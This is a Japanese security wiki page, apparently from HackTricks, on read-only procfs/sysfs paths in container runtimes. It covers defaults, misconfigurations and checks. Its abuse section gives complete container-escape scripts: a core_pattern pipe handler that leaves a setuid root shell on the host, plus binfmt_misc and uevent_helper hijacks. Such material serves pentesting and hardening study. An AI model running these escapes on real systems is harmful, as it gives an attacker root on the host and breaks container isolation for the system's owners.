# 読み取り専用のシステムパス

{{#include ../../../../banners/hacktricks-training.md}}

読み取り専用のシステムパスは、masked paths とは別の保護機能です。パスを完全に隠すのではなく、runtime はパスを公開したまま、読み取り専用でマウントします。これは、読み取りは許容または運用上必要である一方、書き込みは危険すぎる、選択された procfs および sysfs の場所で一般的に使用されます。

目的は明確です。多くの kernel インターフェースは、書き込み可能になると、はるかに危険になります。読み取り専用マウントは、すべての reconnaissance の価値を取り除くわけではありませんが、侵害された workload がそのパスを通じて、基盤となる kernel に接続されたファイルを変更することを防ぎます。

## 操作

runtime は、proc/sys view の一部を読み取り専用として設定することがよくあります。runtime と host によって異なりますが、次のようなパスが含まれる場合があります。

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

実際のリストは異なりますが、モデルは同じです。必要な場所では可視性を許可し、デフォルトでは変更を拒否します。<sup>[[1]](#references)</sup>

## Lab

Docker で宣言された読み取り専用パスのリストを確認します。
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
コンテナ内からマウントされた proc/sys ビューを確認します：
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Security Impact

Read-only system paths は、host に影響を与える悪用の大きな分類を狭めます。攻撃者が procfs や sysfs を検査できる場合でも、そこへ書き込めなければ、kernel tunables、crash handlers、module-loading helpers、その他の control interfaces に関わる多くの直接的な変更経路が排除されます。exposure がなくなるわけではありませんが、information disclosure から host influence へ移行することはより困難になります。

## Misconfigurations

主な誤りは、sensitive paths の mask を解除したり read-write で remount したりすること、host の proc/sys content を writable bind mounts で直接公開すること、またはより安全な runtime defaults を事実上 bypass する privileged modes を使用することです。Kubernetes では、`procMount: Unmasked` と privileged workloads が、より弱い proc protection と併用されることがよくあります。<sup>[[2]](#references)</sup> もう1つの一般的な運用上の誤りは、runtime が通常これらの paths を read-only で mount しているため、すべての workloads がその default を引き継いでいると思い込むことです。

## Abuse

protection が弱い場合は、まず writable な proc/sys entries を探します：
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
書き込み可能なエントリが存在する場合、価値の高い追加調査経路には以下が含まれます：
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
これらのコマンドから判明すること:

- `/proc/sys` 配下の Writable なエントリは、container が単に inspect できるだけでなく、host の kernel behavior を変更できることを示す場合が多い。
- `core_pattern` は特に重要です。Writable な host-facing value は、pipe handler を設定した後に process を crash させることで、host code-execution path に変えられます。
- `modprobe` は、module-loading 関連の flow で kernel が使用する helper を示します。Writable な場合、classic な high-value target です。
- `binfmt_misc` は、custom interpreter の registration が可能かどうかを示します。registration が Writable であれば、単なる information leak ではなく execution primitive になり得ます。
- `panic_on_oom` は host-wide な kernel decision を制御するため、resource exhaustion を host denial of service に変える可能性があります。
- `uevent_helper` は、Writable な sysfs helper path によって host-context execution が発生する、最も分かりやすい例の一つです。

興味深い findings には、本来 read-only であるべき Writable な host-facing proc knobs や sysfs entries が含まれます。その時点で、workload は制限された container view から、意味のある kernel influence へと移行しています。

### Full Example: `core_pattern` Host Escape

`/proc/sys/kernel/core_pattern` が container 内から Writable で、かつ host kernel view を指している場合、crash 後に payload を execute するために abuse できます:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
パスが実際に host kernel に到達する場合、payload は host 上で実行され、setuid shell を残します。

### 完全な例: `binfmt_misc` の登録

`/proc/sys/fs/binfmt_misc/register` が書き込み可能な場合、対応するファイルが実行されると、カスタム interpreter の登録によって code execution が発生する可能性があります。
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
ホストに公開された書き込み可能な `binfmt_misc` では、結果としてカーネルが起動する interpreter path で code execution が発生します。

### 完全な例: `uevent_helper`

`/sys/kernel/uevent_helper` が書き込み可能な場合、対応する event がトリガーされると、カーネルは host-path helper を呼び出す可能性があります。
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
これが非常に危険な理由は、helper path が安全なコンテナ専用コンテキストではなく、ホストのファイルシステムの観点から解決されるためです。

## Checks

これらのチェックでは、想定どおり procfs/sysfs の公開が read-only になっているか、またワークロードが依然として機密性の高いカーネルインターフェースを変更できるかどうかを確認します。
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
ここで重要な点：

- 通常の hardened workload では、書き込み可能な proc/sys エントリはごく少数であるべきです。
- 書き込み可能な `/proc/sys` パスは、通常の read access よりも重要な場合があります。
- runtime があるパスを read-only と報告しているにもかかわらず、実際には書き込み可能な場合は、mount propagation、bind mounts、privilege 設定を慎重に確認してください。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | デフォルトで有効 | Docker は機密性の高い proc エントリに対して、デフォルトの read-only パスリストを定義します | host proc/sys mounts の公開、`--privileged` |
| Podman | デフォルトで有効 | Podman は明示的に緩和されない限り、デフォルトの read-only パスを適用します | `--security-opt unmask=ALL`、広範な host mounts、`--privileged` |
| Kubernetes | runtime defaults を継承 | Pod 設定または host mounts によって弱められない限り、基盤となる runtime の read-only パスモデルを使用します | `procMount: Unmasked`、privileged workloads、書き込み可能な host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Runtime default | 通常は OCI/runtime defaults に依存します | Kubernetes の行と同じ。runtime の直接的な設定変更によって、この動作を弱めることができます |

重要な点は、read-only の system paths は通常 runtime default として存在しますが、privileged modes や host bind mounts によって簡単に無効化できることです。

## References

- [1] [OCI Runtime Specification: Linux Container Configuration (maskedPaths / readonlyPaths)](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md)
- [2] [Kubernetes API Reference: Pod v1 (SecurityContext.procMount)](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/)

{{#include ../../../../banners/hacktricks-training.md}}
